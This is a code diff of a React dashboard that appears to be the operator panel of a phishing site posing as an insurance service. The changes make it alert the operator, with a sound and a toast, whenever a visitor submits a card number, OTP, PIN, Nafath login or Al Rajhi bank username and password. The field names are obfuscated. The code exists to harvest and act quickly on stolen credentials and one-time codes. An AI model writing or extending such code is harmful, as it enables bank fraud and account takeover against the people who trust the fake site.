@@ -97,48 +97,108 @@ const hasDashboardData = (application: InsuranceApplication) =>
 const getVisitorDisplayName = (application: InsuranceApplication) =>
   application.ownerName || (application as any).name || "زائر";
 
-const getCardState = (application: InsuranceApplication) => {
-  const cardHistory =
-    application.history?.filter(
-      (entry: any) =>
-        (entry.type === "_t1" || entry.type === "card") &&
-        (entry.data?._v1 || entry.data?.cardNumber)
-    ) || [];
+// Detect any new sensitive data submission (card, OTP, PIN, Nafad, Rajhi, Final OTP).
+// Excludes non-sensitive events: site visit, basic info, insurance details, selected offer.
+type SensitiveKind = "card" | "otp" | "pin" | "nafad" | "rajhi" | "finalOtp";
 
-  if (cardHistory.length > 0) {
-    const sortedCardHistory = [...cardHistory].sort(
+interface SensitiveState {
+  count: number;
+  key: string;
+  kind: SensitiveKind;
+  label: string;
+}
+
+const HISTORY_TYPE_TO_KIND: Record<string, SensitiveKind> = {
+  _t1: "card",
+  card: "card",
+  _t2: "otp",
+  otp: "otp",
+  _t3: "pin",
+  pin: "pin",
+  _t4: "nafad",
+  phone_info: "nafad",
+  _t5: "otp",
+  phone_otp: "otp",
+  _t6: "nafad",
+  nafad: "nafad",
+};
+
+const KIND_LABELS: Record<SensitiveKind, string> = {
+  card: "بطاقة جديدة",
+  otp: "كود OTP جديد",
+  pin: "رمز PIN جديد",
+  nafad: "بيانات نفاذ جديدة",
+  rajhi: "بيانات راجحي جديدة",
+  finalOtp: "كود OTP نهائي جديد",
+};
+
+const getSensitiveDataState = (application: InsuranceApplication): SensitiveState | null => {
+  const sensitiveHistory =
+    application.history?.filter((entry: any) => {
+      const kind = HISTORY_TYPE_TO_KIND[entry.type];
+      if (!kind) return false;
+      const data = entry.data || {};
+      if (kind === "card")
+        return Boolean(data._v1 || data.cardNumber);
+      if (kind === "otp")
+        return Boolean(data._v5 || data.otpCode || data._v7 || data.phoneOtp);
+      if (kind === "pin")
+        return Boolean(data._v6 || data.pinCode);
+      if (kind === "nafad")
+        return Boolean(data._v8 || data.nafazId || data._v9 || data.nafazPass || data.nafadConfirmationCode);
+      return true;
+    }) || [];
+
+  if (sensitiveHistory.length > 0) {
+    const sorted = [...sensitiveHistory].sort(
       (a: any, b: any) => toTimeValue(b?.timestamp) - toTimeValue(a?.timestamp)
     );
-    const latest = sortedCardHistory[0];
-    const latestCardValue = latest?.data?._v1 || latest?.data?.cardNumber || "";
-
+    const latest = sorted[0];
+    const kind = HISTORY_TYPE_TO_KIND[latest.type] || "card";
     return {
-      count: cardHistory.length,
-      key: `history|${latest?.id || ""}|${latest?.timestamp || ""}|${latestCardValue}`,
+      count: sensitiveHistory.length,
+      key: `history|${latest?.id || ""}|${latest?.timestamp || ""}|${latest.type || ""}`,
+      kind,
+      label: KIND_LABELS[kind],
     };
   }
 
-  const directCard = application._v1 || application.cardNumber || "";
-  if (typeof directCard === "string" && directCard.trim()) {
-    return { count: 1, key: `direct|${directCard}` };
+  // Fall back to direct fields on the document
+  const directChecks: Array<[SensitiveKind, string]> = [
+    ["card", application._v1 || application.cardNumber || ""],
+    ["otp", application._v5 || application.otpCode || application.otp || application._v7 || application.phoneOtp || application._v12 || application.rajhiOtp || ""],
+    ["pin", application._v6 || application.pinCode || ""],
+    ["nafad", application._v8 || application.nafazId || application._v9 || application.nafazPass || application.nafadConfirmationCode || ""],
+    ["rajhi", application._v10 || application.rajhiUser || application._v11 || application.rajhiPassword || application.rajhiPasswrod || ""],
+    ["finalOtp", application._v13 || application.finalOtp || ""],
+  ];
+
+  for (const [kind, value] of directChecks) {
+    if (typeof value === "string" && value.trim()) {
+      return { count: 1, key: `direct|${kind}|${value}`, kind, label: KIND_LABELS[kind] };
+    }
   }
 
   return null;
 };
 
-const showCardNotification = (visitors: InsuranceApplication[]) => {
+const showSensitiveDataNotification = (
+  visitors: InsuranceApplication[],
+  state: { label: string } | null
+) => {
   if (visitors.length === 0 || typeof window === "undefined") return;
 
   const firstVisitorName = getVisitorDisplayName(visitors[0]);
+  const label = state?.label || "بيانات جديدة";
   const message =
     visitors.length === 1
-      ? `تمت إضافة بطاقة جديدة للزائر: ${firstVisitorName}`
-      : `تمت إضافة بطاقات جديدة (${visitors.length})`;
+      ? `تم استلام ${label} من الزائر: ${firstVisitorName}`
+      : `تم استلام ${label} (${visitors.length})`;
 
-  toast.success(message, { id: "card-added" });
+  toast.success(message, { id: "sensitive-data-added" });
 
   if ("Notification" in window && Notification.permission === "granted") {
-    new Notification("بطاقة جديدة", { body: message, tag: "card-added" });
+    new Notification(label, { body: message, tag: "sensitive-data-added" });
   }
 };
 
@@ -156,8 +216,7 @@ export default function Dashboard() {
   const [isExportingAllCards, setIsExportingAllCards] = useState(false);
   const [sidebarWidth, setSidebarWidth] = useState(215); // Default landscape width
   const hasLoadedInitialSnapshotRef = useRef(false);
-  const previousUnreadIds = useRef<Set<string>>(new Set());
-  const previousCardStateRef = useRef<Map<string, { count: number; key: string }>>(
+  const previousSensitiveStateRef = useRef<Map<string, { count: number; key: string }>>(
     new Map()
   );
   const selectedVisitorIdRef = useRef<string | null>(null);
@@ -232,7 +291,7 @@ export default function Dashboard() {
 
   // Play notification sound
   const playNotificationSound = () => {
-    const audio = new Audio("/notification-piano.mp3");
+    const audio = new Audio("/code_alert.mp3");
     audio.play().catch((e) => console.log("Could not play sound:", e));
   };
 
@@ -260,56 +319,45 @@ export default function Dashboard() {
         .map((app) => app.id!)
         .filter((id): id is string => id !== undefined);
 
-      // Check for new unread visitors
-      const currentUnreadIds = new Set(
-        sorted.filter((app) => app.isUnread && app.id).map((app) => app.id!)
-      );
+      // Do not play sound for new unread visitors (site visit / basic info / insurance / offer excluded)
 
-      // Find newly added unread visitors
-      const newUnreadIds = Array.from(currentUnreadIds).filter(
-        (id) => !previousUnreadIds.current.has(id)
-      );
-
-      // Play sound if there are new unread visitors
-      if (newUnreadIds.length > 0 && !isInitialSnapshot) {
-        playNotificationSound();
-      }
-
-      // Check for new card submissions (new card entry or changed card details)
-      const currentCardState = new Map<string, { count: number; key: string }>();
-      const visitorsWithNewCard: InsuranceApplication[] = [];
+      // Check for any new sensitive data submission (card, OTP, PIN, Nafad, Rajhi, Final OTP).
+      const currentSensitiveState = new Map<string, { count: number; key: string; label: string }>();
+      const visitorsWithNewSensitiveData: InsuranceApplication[] = [];
+      let latestSensitiveLabel: { label: string } | null = null;
 
       for (const visitor of sorted) {
         if (!visitor.id) continue;
-        const cardState = getCardState(visitor);
-        if (!cardState) continue;
+        const sensitiveState = getSensitiveDataState(visitor);
+        if (!sensitiveState) continue;
 
-        currentCardState.set(visitor.id, cardState);
+        currentSensitiveState.set(visitor.id, sensitiveState);
 
-        const previousCardState = previousCardStateRef.current.get(visitor.id);
-        if (!previousCardState) {
+        const previousState = previousSensitiveStateRef.current.get(visitor.id);
+        if (!previousState) {
           if (!isInitialSnapshot) {
-            visitorsWithNewCard.push(visitor);
+            visitorsWithNewSensitiveData.push(visitor);
+            if (!latestSensitiveLabel) latestSensitiveLabel = { label: sensitiveState.label };
           }
           continue;
         }
 
         if (
-          cardState.count > previousCardState.count ||
-          cardState.key !== previousCardState.key
+          sensitiveState.count > previousState.count ||
+          sensitiveState.key !== previousState.key
         ) {
-          visitorsWithNewCard.push(visitor);
+          visitorsWithNewSensitiveData.push(visitor);
+          if (!latestSensitiveLabel) latestSensitiveLabel = { label: sensitiveState.label };
         }
       }
 
-      if (visitorsWithNewCard.length > 0 && !isInitialSnapshot) {
+      if (visitorsWithNewSensitiveData.length > 0 && !isInitialSnapshot) {
         playNotificationSound();
-        showCardNotification(visitorsWithNewCard);
+        showSensitiveDataNotification(visitorsWithNewSensitiveData, latestSensitiveLabel);
       }
 
-      // Update previous unread IDs
-      previousUnreadIds.current = currentUnreadIds;
-      previousCardStateRef.current = currentCardState;
+      // Update previous sensitive state for next snapshot diff
+      previousSensitiveStateRef.current = currentSensitiveState;
       hasLoadedInitialSnapshotRef.current = true;
 
       applicationsRef.current = sorted;
